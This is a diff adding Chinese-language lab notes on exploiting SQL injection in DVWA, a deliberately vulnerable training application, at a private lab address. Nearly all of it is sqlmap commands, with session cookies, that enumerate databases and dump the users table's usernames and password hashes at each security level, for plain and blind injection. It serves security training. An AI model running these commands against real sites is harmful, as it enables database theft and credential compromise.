@@ -738,6 +738,206 @@ if(is_numeric( $id ))
 
 
 
+### SQLMap工具注入
+
+#### Security Low
+
+记住要加上cookie
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/?id=1&Submit=Submit#" -v 3 --cookie="PHPSESSID=kdrdnbrglpb6o5relntdaiec81; security=low"
+```
+
+然后一直按y即可
+
+![image-20250218204709376](../../_media/image-20250218204709376.png)
+
+
+
+
+
+爆破数据库：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/?id=1&Submit=Submit#" -v 3 --cookie="PHPSESSID=kdrdnbrglpb6o5relntdaiec81; security=low" --dbs
+```
+
+![image-20250218204851059](../../_media/image-20250218204851059.png)
+
+
+
+爆破数据库中的表：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/?id=1&Submit=Submit#" -v 3 --cookie="PHPSESSID=kdrdnbrglpb6o5relntdaiec81; security=low" -D dvwa --tables
+```
+
+![image-20250218204909255](../../_media/image-20250218204909255.png)
+
+
+
+爆破列：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/?id=1&Submit=Submit#" -v 3 --cookie="PHPSESSID=kdrdnbrglpb6o5relntdaiec81; security=low" -D dvwa -T users --columns
+```
+
+![image-20250218204925786](../../_media/image-20250218204925786.png)
+
+
+
+
+
+爆破用户字段：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/?id=1&Submit=Submit#" -v 3 --cookie="PHPSESSID=kdrdnbrglpb6o5relntdaiec81; security=low" -D dvwa -T users -C user --dump
+```
+
+![image-20250218204953838](../../_media/image-20250218204953838.png)
+
+
+
+爆破密码字段：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/?id=1&Submit=Submit#" -v 3 --cookie="PHPSESSID=kdrdnbrglpb6o5relntdaiec81; security=low" -D dvwa -T users -C password --dump
+```
+
+![image-20250218205548504](../../_media/image-20250218205548504.png)
+
+
+
+#### Security Medium
+
+可以看到这个是使用POST方法来进行传递的
+
+抓包发现传递的数据包，然后直接使用sqlmap即可
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" 
+```
+
+发现危险注入的地方
+
+![image-20250219144306784](../../_media/image-20250219144306784.png)
+
+
+
+
+
+爆库
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" --dbs
+```
+
+
+
+爆表
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa --tables
+```
+
+
+
+爆列
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa -T users --columns
+```
+
+
+
+爆用户字段
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa -T users -C user --dump
+```
+
+
+
+爆密码字段
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa -T users -C password --dump
+```
+
+也可以直接进行md5的解密
+
+![image-20250219144434871](../../_media/image-20250219144434871.png)
+
+
+
+
+
+
+
+#### Security High
+
+由于是在第二个页面，所以要进行联合查询命令
+
+```
+--second-u "http://192.168.10.129:3000/vulnerabilities/sqli/"
+```
+
+尝试
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/session-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli/" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" 
+```
+
+也是可以查找出危险点
+
+![image-20250219145149678](../../_media/image-20250219145149678.png)
+
+
+
+
+
+爆库
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/session-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli/" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" --dbs
+```
+
+
+
+爆表
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/session-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli/" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" -D dvwa --tables
+```
+
+
+
+爆列
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/session-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli/" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" -D dvwa -T users --columns
+```
+
+
+
+爆用户字段
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/session-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli/" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" -D dvwa -T users -C user --dump
+```
+
+
+
+爆密码字段
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli/session-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli/" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" -D dvwa -T users -C password --dump
+```
+
+
+
+
+
 ## SQL Injection（Blind）
 
 盲注就是无回显。盲注挺多的，布尔、时间，建议这类题目学会写脚本，或者使用SQLmap工具进行注入。
@@ -793,6 +993,156 @@ if(is_numeric( $id ))
 ### Security Impossible
 
 也是一样，token加上数字的限制。
+
+
+
+### SQLMap工具注入
+
+#### Security Low
+
+一样做法
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=low"
+```
+
+![image-20250219151140860](../../_media/image-20250219151140860.png)
+
+
+
+库：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=low" --dbs
+```
+
+
+
+表：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=low" -D dvwa --tables
+```
+
+
+
+列：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=low" -D dvwa -T users --columns
+```
+
+
+
+用户字段：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=low" -D dvwa -T users -C user --dump
+```
+
+
+
+密码字段：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=low" -D dvwa -T users -C password --dump
+```
+
+由于是盲注，所以最后的答案应该是一位一位试出来的
+
+![image-20250219151252665](../../_media/image-20250219151252665.png)
+
+
+
+#### Security Medium
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" 
+```
+
+![image-20250219151546703](../../_media/image-20250219151546703.png)
+
+
+
+爆库
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" --dbs
+```
+
+
+
+爆表
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa --tables
+```
+
+
+
+爆列
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa -T users --columns
+```
+
+
+
+爆用户字段
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa -T users -C user --dump
+```
+
+
+
+爆密码字段
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit"  --cookie="PHPSESSID=c5emugcincc74avtcvj0f65mns; security=medium" -D dvwa -T users -C password --dump
+```
+
+
+
+#### Security High
+
+注入点在cookie中
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/cookie-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" --batch
+```
+
+![image-20250219154115383](../../_media/image-20250219154115383.png)
+
+爆库：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/cookie-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" --dbs
+```
+
+爆表：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/cookie-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" -D dvwa --tables
+```
+
+爆列：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/cookie-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" -D dvwa -T users --columns
+```
+
+爆字段：
+
+```
+python sqlmap.py -u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/cookie-input.php" --data "id=1&Submit=Submit" --second-u "http://192.168.10.129:3000/vulnerabilities/sqli_blind/" --cookie="id=1; PHPSESSID=c5emugcincc74avtcvj0f65mns; security=high" -D dvwa -T users -C "user,password" --dump
+```
+
+盲注一般所花的时间较长，不管是布尔盲注还是时间盲注都是要不断在每一个位置上循环遍历所有字符的！
+
+![image-20250219155250162](../../_media/image-20250219155250162.png)
+
+
 
 
 
